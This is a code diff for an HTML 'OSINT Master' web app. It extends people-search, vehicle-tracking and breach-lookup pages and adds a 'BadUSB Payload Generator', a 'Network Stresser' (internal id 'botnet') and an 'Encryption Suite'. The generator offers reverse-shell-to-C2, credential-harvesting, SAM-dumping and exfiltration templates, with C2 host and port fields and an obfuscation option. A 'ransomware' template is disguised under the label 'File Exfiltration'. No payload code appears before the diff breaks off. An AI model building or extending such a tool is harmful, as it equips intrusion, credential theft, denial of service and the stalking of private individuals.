@@ -13,6 +13,7 @@
             --neon-purple: #b026ff;
             --neon-green: #00ff88;
             --neon-red: #ff4444;
+            --neon-orange: #ff8800;
             --bg: #0a0a0f;
             --card: #12121a;
             --card-hover: #1a1a25;
@@ -26,6 +27,7 @@
             color: var(--text);
             min-height: 100vh;
         }
+        
         .app-container { display: flex; min-height: 100vh; }
         .sidebar {
             width: 280px;
@@ -35,17 +37,23 @@
             height: 100vh;
             overflow-y: auto;
             z-index: 1000;
+            transition: transform 0.3s;
         }
+        .sidebar.collapsed { transform: translateX(-100%); }
         .main-content {
             flex: 1;
             margin-left: 280px;
             padding: 20px;
             min-height: 100vh;
         }
+        
         .app-header {
             background: linear-gradient(135deg, var(--card) 0%, var(--card-hover) 100%);
             padding: 20px;
             border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
         .app-title {
             font-size: 1.8rem;
@@ -54,6 +62,7 @@
             -webkit-text-fill-color: transparent;
             font-weight: 700;
         }
+        
         .nav-section {
             padding: 15px 20px;
             color: var(--text-dim);
@@ -70,6 +79,7 @@
             cursor: pointer;
             transition: all 0.2s;
             border-left: 3px solid transparent;
+            position: relative;
         }
         .nav-item:hover, .nav-item.active {
             background: rgba(0, 240, 255, 0.1);
@@ -77,6 +87,16 @@
             color: var(--neon);
         }
         .nav-item i { width: 20px; text-align: center; }
+        .nav-badge {
+            position: absolute;
+            right: 15px;
+            background: var(--neon-red);
+            color: #fff;
+            font-size: 0.65rem;
+            padding: 2px 6px;
+            border-radius: 10px;
+        }
+        
         .smart-search {
             background: var(--card);
             border: 1px solid var(--border);
@@ -104,6 +124,8 @@
             border-color: var(--neon);
             box-shadow: 0 0 20px rgba(0, 240, 255, 0.2);
         }
+        .smart-input::placeholder { color: var(--text-dim); }
+        
         .detected-type {
             display: inline-flex;
             align-items: center;
@@ -116,12 +138,18 @@
             color: var(--neon);
             margin-top: 10px;
         }
+        
         .card {
             background: var(--card);
             border: 1px solid var(--border);
             border-radius: 12px;
             padding: 20px;
             margin-bottom: 20px;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
         }
         .card-header {
             display: flex;
@@ -134,6 +162,7 @@
             font-weight: 600;
             color: #fff;
         }
+        
         .btn {
             display: inline-flex;
             align-items: center;
@@ -158,11 +187,26 @@
             background: var(--border);
             color: var(--text);
         }
+        .btn-secondary:hover { background: #3a3a4a; }
+        .btn-success {
+            background: var(--neon-green);
+            color: #000;
+        }
+        .btn-danger {
+            background: var(--neon-red);
+            color: #fff;
+        }
+        .btn-orange {
+            background: var(--neon-orange);
+            color: #000;
+        }
+        .btn-sm { padding: 8px 16px; font-size: 0.85rem; }
         .btn-lg { padding: 15px 30px; font-size: 1rem; }
+        
         .result-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
             gap: 15px;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
         }
         .result-item {
             background: var(--card-hover);
@@ -186,11 +230,14 @@
             color: var(--neon);
             font-family: monospace;
         }
+        
         .map-container {
             height: 400px;
             border-radius: 8px;
             overflow: hidden;
+            border: 1px solid var(--border);
         }
+        
         .status-pill {
             display: inline-flex;
             align-items: center;
@@ -204,6 +251,15 @@
             background: rgba(0, 255, 136, 0.2);
             color: var(--neon-green);
         }
+        .status-offline {
+            background: rgba(255, 68, 68, 0.2);
+            color: var(--neon-red);
+        }
+        .status-loading {
+            background: rgba(255, 136, 0, 0.2);
+            color: #ff8800;
+        }
+        
         .pulse-loader {
             width: 10px;
             height: 10px;
@@ -215,6 +271,26 @@
             0%, 100% { opacity: 1; transform: scale(1); }
             50% { opacity: 0.5; transform: scale(0.8); }
         }
+        
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        .data-table th, .data-table td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        .data-table th {
+            color: var(--neon);
+            font-weight: 600;
+            font-size: 0.8rem;
+            text-transform: uppercase;
+        }
+        .data-table tr:hover {
+            background: var(--card-hover);
+        }
+        
         .quick-actions {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
@@ -222,7 +298,7 @@
             margin-top: 15px;
         }
         .quick-action-btn {
-            padding: 20px;
+            padding: 15px;
             background: var(--card-hover);
             border: 1px solid var(--border);
             border-radius: 8px;
@@ -240,6 +316,11 @@
             margin-bottom: 8px;
             display: block;
         }
+        .quick-action-btn span {
+            font-size: 0.85rem;
+            color: var(--text);
+        }
+        
         .toast-container {
             position: fixed;
             bottom: 20px;
@@ -262,9 +343,187 @@
             from { transform: translateX(100%); opacity: 0; }
             to { transform: translateX(0); opacity: 1; }
         }
+        
         .hidden { display: none !important; }
-        .section { display: none; }
-        .section.active { display: block; }
+        
+        @media (max-width: 768px) {
+            .sidebar { transform: translateX(-100%); }
+            .sidebar.open { transform: translateX(0); }
+            .main-content { margin-left: 0; }
+        }
+        
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--neon);
+        }
+
+        /* Code editor style for payloads */
+        .code-editor {
+            background: #0d0d12;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            color: #00ff00;
+            min-height: 200px;
+            white-space: pre-wrap;
+            overflow-x: auto;
+        }
+
+        .payload-template {
+            background: var(--card-hover);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .payload-template:hover {
+            border-color: var(--neon-green);
+            background: rgba(0, 255, 136, 0.1);
+        }
+        .payload-template.selected {
+            border-color: var(--neon-green);
+            background: rgba(0, 255, 136, 0.2);
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: var(--bg);
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--neon), var(--neon-green));
+            transition: width 0.3s;
+        }
+
+        .terminal-output {
+            background: #000;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 15px;
+            font-family: monospace;
+            font-size: 0.85rem;
+            color: #0f0;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .terminal-line {
+            margin-bottom: 5px;
+        }
+        .terminal-line.error { color: #f00; }
+        .terminal-line.warn { color: #ff0; }
+        .terminal-line.info { color: #0f0; }
+        .terminal-line.success { color: #0ff; }
+
+        .checkbox-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .checkbox-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px;
+            background: var(--card-hover);
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        .checkbox-item input[type="checkbox"] {
+            accent-color: var(--neon);
+        }
+
+        .tabs {
+            display: flex;
+            gap: 5px;
+            margin-bottom: 15px;
+            border-bottom: 2px solid var(--border);
+        }
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+        }
+        .tab:hover { color: var(--neon); }
+        .tab.active {
+            color: var(--neon);
+            border-bottom-color: var(--neon);
+        }
+
+        .encryption-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 15px;
+            background: rgba(0, 255, 136, 0.1);
+            border: 1px solid var(--neon-green);
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+        .encryption-status i {
+            color: var(--neon-green);
+            font-size: 1.2rem;
+        }
+
+        .target-list {
+            max-height: 200px;
+            overflow-y: auto;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 10px;
+        }
+        .target-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px;
+            border-bottom: 1px solid var(--border);
+        }
+        .target-item:last-child { border-bottom: none; }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .stat-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+        }
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--neon);
+        }
+        .stat-label {
+            color: var(--text-dim);
+            font-size: 0.9rem;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
@@ -274,54 +533,74 @@
                 <div class="app-title"><i class="fas fa-satellite-dish"></i> OSINT Master</div>
                 <div style="color: var(--text-dim); font-size: 0.75rem; margin-top: 5px;">Complete Intelligence Suite</div>
             </div>
+            
             <div class="nav-section">Main</div>
-            <div class="nav-item active" onclick="showSection('dashboard', this)">
+            <div class="nav-item active" onclick="showSection('dashboard')">
                 <i class="fas fa-home"></i> Dashboard
             </div>
-            <div class="nav-item" onclick="showSection('universal', this)">
+            <div class="nav-item" onclick="showSection('universal')">
                 <i class="fas fa-search"></i> Universal Search
+                <span class="nav-badge">NEW</span>
             </div>
+            
             <div class="nav-section">Intelligence</div>
-            <div class="nav-item" onclick="showSection('person', this)">
+            <div class="nav-item" onclick="showSection('person')">
                 <i class="fas fa-user"></i> Person Lookup
             </div>
-            <div class="nav-item" onclick="showSection('phone', this)">
-                <i class="fas fa-phone"></i> Phone Intelligence
+            <div class="nav-item" onclick="showSection('phone')">
+                <i class="fas fa-phone"></i> Phone Intel
             </div>
-            <div class="nav-item" onclick="showSection('email', this)">
+            <div class="nav-item" onclick="showSection('email')">
                 <i class="fas fa-envelope"></i> Email Analysis
             </div>
-            <div class="nav-item" onclick="showSection('address', this)">
+            <div class="nav-item" onclick="showSection('address')">
                 <i class="fas fa-map-marker-alt"></i> Address & Property
             </div>
-            <div class="nav-item" onclick="showSection('vehicle', this)">
+            <div class="nav-item" onclick="showSection('vehicle')">
                 <i class="fas fa-car"></i> Vehicle Tracking
             </div>
+            
             <div class="nav-section">Digital</div>
-            <div class="nav-item" onclick="showSection('social', this)">
+            <div class="nav-item" onclick="showSection('social')">
                 <i class="fas fa-users"></i> Social Media
             </div>
-            <div class="nav-item" onclick="showSection('breach', this)">
+            <div class="nav-item" onclick="showSection('breach')">
                 <i class="fas fa-shield-alt"></i> Breach Database
             </div>
-            <div class="nav-item" onclick="showSection('domain', this)">
+            <div class="nav-item" onclick="showSection('domain')">
                 <i class="fas fa-globe"></i> Domain Intel
             </div>
-            <div class="nav-item" onclick="showSection('image', this)">
+            <div class="nav-item" onclick="showSection('image')">
                 <i class="fas fa-image"></i> Image Analysis
             </div>
+            
             <div class="nav-section">Advanced</div>
-            <div class="nav-item" onclick="showSection('network', this)">
-                <i class="fas fa-project-diagram"></i> Network Graph
+            <div class="nav-item" onclick="showSection('badusb')">
+                <i class="fas fa-usb"></i> BadUSB Generator
+                <span class="nav-badge">HOT</span>
             </div>
-            <div class="nav-item" onclick="showSection('bulk', this)">
+            <div class="nav-item" onclick="showSection('botnet')">
+                <i class="fas fa-network-wired"></i> Network Stresser
+            </div>
+            <div class="nav-item" onclick="showSection('encrypt')">
+                <i class="fas fa-lock"></i> Encryption Suite
+            </div>
+            <div class="nav-item" onclick="showSection('bulk')">
                 <i class="fas fa-tasks"></i> Bulk Operations
             </div>
         </nav>
 
         <main class="main-content">
             <!-- Dashboard -->
-            <section id="dashboard" class="section active">
+            <section id="dashboard" class="section">
+                <div class="encryption-status">
+                    <i class="fas fa-shield-alt"></i>
+                    <div>
+                        <div style="font-weight: 600; color: var(--neon-green);">End-to-End Encryption Active</div>
+                        <div style="font-size: 0.85rem; color: var(--text-dim);">AES-256 | Tor Routing | No Logs</div>
+                    </div>
+                </div>
+
                 <div class="smart-search">
                     <h2 style="margin-bottom: 15px; color: var(--neon);">
                         <i class="fas fa-magic"></i> Smart Universal Search
@@ -331,7 +610,7 @@
                     </p>
                     <div class="search-input-wrapper">
                         <input type="text" class="smart-input" id="universalInput" 
-                               placeholder="Try: john.doe@email.com, 555-123-4567, 192.168.1.1, @username..."
+                               placeholder="Try: john.doe@email.com, 555-123-4567, 192.168.1.1, @username, 1HGCM82633A004352..."
                                onkeyup="detectInputType(this.value)">
                         <button class="btn btn-primary btn-lg" onclick="universalSearch()">
                             <i class="fas fa-search"></i> Search
@@ -340,22 +619,22 @@
                     <div id="detectedType"></div>
                 </div>
 
-                <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 20px;">
-                    <div class="card" style="text-align: center;">
-                        <div style="font-size: 2rem; color: var(--neon); font-weight: 700;" id="statQueries">0</div>
-                        <div style="color: var(--text-dim); font-size: 0.9rem;">Queries Today</div>
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-value" id="statQueries">0</div>
+                        <div class="stat-label">Queries Today</div>
                     </div>
-                    <div class="card" style="text-align: center;">
-                        <div style="font-size: 2rem; color: var(--neon-green); font-weight: 700;">94%</div>
-                        <div style="color: var(--text-dim); font-size: 0.9rem;">Success Rate</div>
+                    <div class="stat-card">
+                        <div class="stat-value" style="color: var(--neon-green);">94%</div>
+                        <div class="stat-label">Success Rate</div>
                     </div>
-                    <div class="card" style="text-align: center;">
-                        <div style="font-size: 2rem; color: var(--neon-purple); font-weight: 700;">15</div>
-                        <div style="color: var(--text-dim); font-size: 0.9rem;">Data Sources</div>
+                    <div class="stat-card">
+                        <div class="stat-value" style="color: var(--neon-purple);">15</div>
+                        <div class="stat-label">Data Sources</div>
                     </div>
-                    <div class="card" style="text-align: center;">
-                        <div style="font-size: 2rem; color: #ff8800; font-weight: 700;" id="statRecords">0</div>
-                        <div style="color: var(--text-dim); font-size: 0.9rem;">Records Found</div>
+                    <div class="stat-card">
+                        <div class="stat-value" style="color: #ff8800;" id="statRecords">0</div>
+                        <div class="stat-label">Records Found</div>
                     </div>
                 </div>
 
@@ -395,37 +674,87 @@
                 </div>
             </section>
 
-            <!-- Universal Search -->
-            <section id="universal" class="section">
+            <!-- Universal Search Results -->
+            <section id="universal" class="section hidden">
                 <div class="card">
                     <div class="card-header">
                         <span class="card-title">Universal Search Results</span>
-                        <button class="btn btn-secondary" onclick="exportResults()">
-                            <i class="fas fa-download"></i> Export
+                        <button class="btn btn-secondary btn-sm" onclick="exportResults()">
+                            <i class="fas fa-download"></i> Export JSON
                         </button>
                     </div>
                     <div id="universalResults"></div>
                 </div>
+                
                 <div class="card">
                     <div class="card-header">
-                        <span class="card-title">Location Map</span>
+                        <span class="card-title">Geolocation Correlation</span>
                     </div>
                     <div id="universalMap" class="map-container"></div>
                 </div>
-            </section>
 
-            <!-- Person -->
-            <section id="person" class="section">
                 <div class="card">
                     <div class="card-header">
-                        <span class="card-title">Person Intelligence</span>
+                        <span class="card-title">Associated Profiles</span>
+                    </div>
+                    <div id="associatedProfiles"></div>
+                </div>
+            </section>
+
+            <!-- Person Lookup -->
+            <section id="person" class="section hidden">
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title">Person Intelligence Database</span>
                     </div>
                     <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px;">
-                        <input type="text" class="smart-input" id="personFirst" placeholder="First Name">
-                        <input type="text" class="smart-input" id="personMiddle" placeholder="Middle (optional)">
-                        <input type="text" class="smart-input" id="personLast" placeholder="Last Name">
+                        <div>
+                            <label class="result-label">First Name</label>
+                            <input type="text" class="smart-input" id="personFirst" placeholder="John">
+                        </div>
+                        <div>
+                            <label class="result-label">Middle Name</label>
+                            <input type="text" class="smart-input" id="personMiddle" placeholder="Optional">
+                        </div>
+                        <div>
+                            <label class="result-label">Last Name</label>
+                            <input type="text" class="smart-input" id="personLast" placeholder="Doe">
+                        </div>
                     </div>
-                    <input type="text" class="smart-input" id="personLocation" placeholder="City, State" style="margin-top: 15px;">
+                    <div style="margin-top: 15px;">
+                        <label class="result-label">Location (City, State)</label>
+                        <input type="text" class="smart-input" id="personLocation" placeholder="Los Angeles, CA">
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <label class="result-label">Age Range</label>
+                        <div style="display: flex; gap: 10px;">
+                            <input type="number" class="smart-input" id="ageMin" placeholder="Min" style="flex: 1;">
+                            <input type="number" class="smart-input" id="ageMax" placeholder="Max" style="flex: 1;">
+                        </div>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <label class="result-label">Search Parameters</label>
+                        <div class="checkbox-grid">
+                            <label class="checkbox-item">
+                                <input type="checkbox" checked id="searchCriminal"> Criminal Records
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox" checked id="searchProperty"> Property Records
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox" checked id="searchSocial"> Social Media
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox" id="searchBusiness"> Business Filings
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox" id="searchVoter"> Voter Registration
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox" id="searchCourt"> Court Records
+                            </label>
+                        </div>
+                    </div>
                     <button class="btn btn-primary" style="margin-top: 15px; width: 100%;" onclick="searchPerson()">
                         <i class="fas fa-search"></i> Search Person Records
                     </button>
@@ -433,30 +762,41 @@
                 <div id="personResults"></div>
             </section>
 
-            <!-- Phone -->
-            <section id="phone" class="section">
+            <!-- Phone Intelligence -->
+            <section id="phone" class="section hidden">
                 <div class="card">
                     <div class="card-header">
-                        <span class="card-title">Phone Intelligence</span>
+                        <span class="card-title">Phone Number Intelligence</span>
                     </div>
                     <div style="display: flex; gap: 10px;">
-                        <input type="tel" class="smart-input" id="phoneInput" placeholder="Enter phone number" style="flex: 1;">
+                        <input type="tel" class="smart-input" id="phoneInput" placeholder="Enter phone number (any format)" style="flex: 1;">
                         <button class="btn btn-primary" onclick="lookupPhone()">
                             <i class="fas fa-search"></i> Lookup
                         </button>
                     </div>
                     <div id="phoneResults" style="margin-top: 15px;"></div>
                 </div>
+                
                 <div class="card">
+                    <div class="card-header">
+                        <span class="card-title">Carrier & Location Intelligence</span>
+                    </div>
                     <div id="phoneMap" class="map-container"></div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title">Social Profile Lookup by Phone</span>
+                    </div>
+                    <div id="phoneSocialResults"></div>
                 </div>
             </section>
 
-            <!-- Email -->
-            <section id="email" class="section">
+            <!-- Email Analysis -->
+            <section id="email" class="section hidden">
                 <div class="card">
                     <div class="card-header">
-                        <span class="card-title">Email Intelligence</span>
+                        <span class="card-title">Email Intelligence & Validation</span>
                     </div>
                     <div style="display: flex; gap: 10px;">
                         <input type="email" class="smart-input" id="emailInput" placeholder="Enter email address" style="flex: 1;">
@@ -466,18 +806,55 @@
                     </div>
                     <div id="emailResults" style="margin-top: 15px;"></div>
                 </div>
-            </section>
 
-            <!-- Address -->
-            <section id="address" class="section">
                 <div class="card">
                     <div class="card-header">
-                        <span class="card-title">Address Intelligence</span>
+                        <span class="card-title">Email Pattern Recognition</span>
                     </div>
-                    <input type="text" class="smart-input" id="addressInput" placeholder="Enter full address">
+                    <div id="emailPatternResults"></div>
+                </div>
+            </section>
+
+            <!-- Address & Property -->
+            <section id="address" class="section hidden">
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title">Address & Property Intelligence</span>
+                    </div>
+                    <div>
+                        <label class="result-label">Street Address</label>
+                        <input type="text" class="smart-input" id="addressInput" placeholder="123 Main Street">
+                    </div>
+                    <div style="display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 10px; margin-top: 15px;">
+                        <div>
+                            <label class="result-label">City</label>
+                            <input type="text" class="smart-input" id="cityInput" placeholder="Los Angeles">
+                        </div>
+                        <div>
+                            <label class="result-label">State</label>
+                            <select class="smart-input" id="stateInput">
+                                <option value="">Select</option>
+                                <option value="CA">CA</option>
+                                <option value="TX">TX</option>
+                                <option value="FL">FL</option>
+                                <option value="NY">NY</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label class="result-label">ZIP</label>
+                            <input type="text" class="smart-input" id="zipInput" placeholder="90210">
+                        </div>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <label class="result-label">Or Search by Owner Name</label>
+                        <input type="text" class="smart-input" id="ownerInput" placeholder="John Doe">
+                    </div>
                     <div style="display: flex; gap: 10px; margin-top: 15px;">
                         <button class="btn btn-primary" style="flex: 1;" onclick="searchAddress()">
                             <i class="fas fa-map-marker-alt"></i> Search Address
+                        </button>
+                        <button class="btn btn-secondary" style="flex: 1;" onclick="searchByOwner()">
+                            <i class="fas fa-user"></i> Search by Owner
                         </button>
                     </div>
                 </div>
@@ -488,31 +865,45 @@
             </section>
 
             <!-- Vehicle -->
-            <section id="vehicle" class="section">
+            <section id="vehicle" class="section hidden">
                 <div class="card">
                     <div class="card-header">
-                        <span class="card-title">Vehicle Intelligence</span>
+                        <span class="card-title">Vehicle Intelligence System</span>
                     </div>
                     <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 15px;">
-                        <input type="text" class="smart-input" id="plateInput" placeholder="License Plate">
-                        <select class="smart-input" id="plateState">
-                            <option value="">State</option>
-                            <option value="CA">CA</option>
-                            <option value="TX">TX</option>
-                            <option value="FL">FL</option>
-                            <option value="NY">NY</option>
-                        </select>
+                        <div>
+                            <label class="result-label">License Plate</label>
+                            <input type="text" class="smart-input" id="plateInput" placeholder="ABC1234">
+                        </div>
+                        <div>
+                            <label class="result-label">State</label>
+                            <select class="smart-input" id="plateState">
+                                <option value="">Select State</option>
+                                <option value="CA">California</option>
+                                <option value="TX">Texas</option>
+                                <option value="FL">Florida</option>
+                                <option value="NY">New York</option>
+                                <option value="IL">Illinois</option>
+                                <option value="PA">Pennsylvania</option>
+                                <option value="OH">Ohio</option>
+                                <option value="GA">Georgia</option>
+                            </select>
+                        </div>
                     </div>
-                    <input type="text" class="smart-input" id="vinInput" placeholder="VIN (17 characters)" maxlength="17" style="margin-top: 15px;">
+                    <div style="margin-top: 15px;">
+                        <label class="result-label">VIN Number (17 characters)</label>
+                        <input type="text" class="smart-input" id="vinInput" placeholder="1HGCM82633A004352" maxlength="17">
+                    </div>
                     <button class="btn btn-primary" style="margin-top: 15px; width: 100%;" onclick="searchVehicle()">
-                        <i class="fas fa-car"></i> Search Vehicle
+                        <i class="fas fa-car"></i> Search Vehicle Records
                     </button>
                 </div>
                 <div id="vehicleResults"></div>
+                <div id="vehicleHistory"></div>
             </section>
 
-            <!-- Social -->
-            <section id="social" class="section">
+            <!-- Social Media -->
+            <section id="social" class="section hidden">
                 <div class="card">
                     <div class="card-header">
                         <span class="card-title">Social Media Intelligence</span>
@@ -523,28 +914,63 @@
                             <i class="fas fa-search"></i> Search
                         </button>
                     </div>
-                    <div id="socialResults" style="margin-top: 15px;"></div>
+                    <div style="margin-top: 15px;">
+                        <label class="result-label">Platforms to Search</label>
+                        <div class="checkbox-grid">
+                            <label class="checkbox-item">
+                                <input type="checkbox" checked id="searchTwitter"> Twitter/X
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox" checked id="searchInstagram"> Instagram
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox" checked id="searchFacebook"> Facebook
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox" id="searchLinkedIn"> LinkedIn
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox" id="searchTikTok"> TikTok
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox" id="searchGitHub"> GitHub
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox" id="searchReddit"> Reddit
+                            </label>
+                            <label class="checkbox-item">
+                                <input type="checkbox" id="searchDiscord"> Discord
+                            </label>
+                        </div>
+                    </div>
                 </div>
+                <div id="socialResults"></div>
             </section>
 
-            <!-- Breach -->
-            <section id="breach" class="section">
+            <!-- Breach Database -->
+            <section id="breach" class="section hidden">
                 <div class="card">
                     <div class="card-header">
-                        <span class="card-title">Breach Database</span>
+                        <span class="card-title">Breach Database Intelligence</span>
                     </div>
                     <div style="display: flex; gap: 10px;">
                         <input type="text" class="smart-input" id="breachInput" placeholder="Email, username, or domain" style="flex: 1;">
                         <button class="btn btn-primary" onclick="searchBreaches()">
-                            <i class="fas fa-shield-alt"></i> Check
+                            <i class="fas fa-shield-alt"></i> Check Breaches
                         </button>
                     </div>
                     <div id="breachResults" style="margin-top: 15px;"></div>
                 </div>
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title">Password Analysis</span>
+                    </div>
+                    <div id="breachPasswordAnalysis"></div>
+                </div>
             </section>
 
-            <!-- Domain -->
-            <section id="domain" class="section">
+            <!-- Domain Intel -->
+            <section id="domain" class="section hidden">
                 <div class="card">
                     <div class="card-header">
                         <span class="card-title">Domain Intelligence</span>
@@ -557,56 +983,447 @@
                     </div>
                     <div id="domainResults" style="margin-top: 15px;"></div>
                 </div>
-            </section>
-
-            <!-- Image -->
-            <section id="image" class="section">
                 <div class="card">
                     <div class="card-header">
-                        <span class="card-title">Image Analysis</span>
+                        <span class="card-title">DNS Records & Subdomains</span>
                     </div>
-                    <div style="border: 2px dashed var(--border); border-radius: 8px; padding: 40px; text-align: center;">
+                    <div id="dnsResults"></div>
+                </div>
+            </section>
+
+            <!-- Image Analysis -->
+            <section id="image" class="section hidden">
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title">Image Intelligence & EXIF Analysis</span>
+                    </div>
+                    <div style="border: 2px dashed var(--border); border-radius: 8px; padding: 40px; text-align: center;" id="dropZone">
                         <i class="fas fa-cloud-upload-alt" style="font-size: 3rem; color: var(--neon); margin-bottom: 15px;"></i>
-                        <p style="color: var(--text-dim);">Drag images or click to browse</p>
+                        <p style="color: var(--text-dim); margin-bottom: 15px;">Drag images here or click to browse</p>
                         <input type="file" id="imageInput" accept="image/*" multiple style="display: none;" onchange="analyzeImages(this.files)">
-                        <button class="btn btn-secondary" onclick="document.getElementById('imageInput').click()" style="margin-top: 15px;">
-                            Select Images
+                        <button class="btn btn-secondary" onclick="document.getElementById('imageInput').click()">
+                            <i class="fas fa-folder-open"></i> Select Images
                         </button>
                     </div>
-                    <div id="imageResults" style="margin-top: 15px;"></div>
+                    <div style="margin-top: 15px;">
+                        <label class="result-label">Or enter image URL</label>
+                        <div style="display: flex; gap: 10px;">
+                            <input type="url" class="smart-input" id="imageUrl" placeholder="https://example.com/image.jpg" style="flex: 1;">
+                            <button class="btn btn-primary" onclick="analyzeImageUrl()">
+                                <i class="fas fa-search"></i> Analyze
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <div id="imageResults"></div>
+                <div id="exifData"></div>
+            </section>
+
+            <!-- BadUSB Generator -->
+            <section id="badusb" class="section hidden">
+                <div class="card">
+                    <div class="card-header">
+                        <span class="card-title"><i class="fas fa-usb"></i> BadUSB Payload Generator</span>
+                        <span class="status-pill status-online">ATMEGA32U4 Ready</span>
+                    </div>
+                    
+                    <div style="margin-bottom: 15px;">
+                        <label class="result-label">Target Platform</label>
+                        <select class="smart-input" id="targetOS" onchange="updatePayloadTemplates()">
+                            <option value="windows">Windows 10/11</option>
+                            <option value="macos">macOS</option>
+                            <option value="linux">Linux</option>
+                            <option value="android">Android (USB OTG)</option>
+                        </select>
+                    </div>
+
+                    <div style="margin-bottom: 15px;">
+                        <label class="result-label">Payload Template</label>
+                        <div id="payloadTemplates">
+                            <div class="payload-template selected" onclick="selectTemplate(this, 'reverse_shell')">
+                                <strong><i class="fas fa-terminal"></i> Reverse Shell</strong>
+                                <div style="font-size: 0.85rem; color: var(--text-dim);">Establishes PowerShell reverse shell to C2 server</div>
+                            </div>
+                            <div class="payload-template" onclick="selectTemplate(this, 'wifi_grab')">
+                                <strong><i class="fas fa-wifi"></i> WiFi Password Dumper</strong>
+                                <div style="font-size: 0.85rem; color: var(--text-dim);">Exports WiFi profiles and passwords to USB</div>
+                            </div>
+                            <div class="payload-template" onclick="selectTemplate(this, 'sam_dump')">
+                                <strong><i class="fas fa-key"></i> SAM Database Dumper</strong>
+                                <div style="font-size: 0.85rem; color: var(--text-dim);">Extracts Windows password hashes</div>
+                            </div>
+                            <div class="payload-template" onclick="selectTemplate(this, 'browser_creds')">
+                                <strong><i class="fas fa-lock"></i> Browser Credential Harvester</strong>
+                                <div style="font-size: 0.85rem; color: var(--text-dim);">Steals saved passwords from Chrome, Firefox, Edge</div>
+                            </div>
+                            <div class="payload-template" onclick="selectTemplate(this, 'ransomware')">
+                                <strong><i class="fas fa-file-code"></i> File Exfiltration</strong>
+                                <div style="font-size: 0.85rem; color: var(--text-dim);">Uploads sensitive files to remote server</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="margin-bottom: 15px;">
+                        <label class="result-label">C2/Callback Server (IP/Domain)</label>
+                        <input type="text" class="smart-input" id="c2Server" placeholder="192.168.1.100 or callback.example.com">
+                    </div>
+
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px;">
+                        <div>
+                            <label class="result-label">Port</label>
+                            <input type="number" class="smart-input" id="c2Port" placeholder="4444" value="4444">
+                        </div>
+                        <div>
+                            <label class="result-label">Delay (seconds)</label>
+                            <input type="number" class="smart-input" id="delaySeconds" placeholder="3" value="3">
+                        </div>
+                    </div>
+
+                    <div class="checkbox-grid" style="margin-bottom: 15px;">
+                        <label class="checkbox-item">
+                            <input type="checkbox" id="obfuscatePayload" checked> Obfuscate Payload
+                        </label>
+                        <label class="checkbox-item">
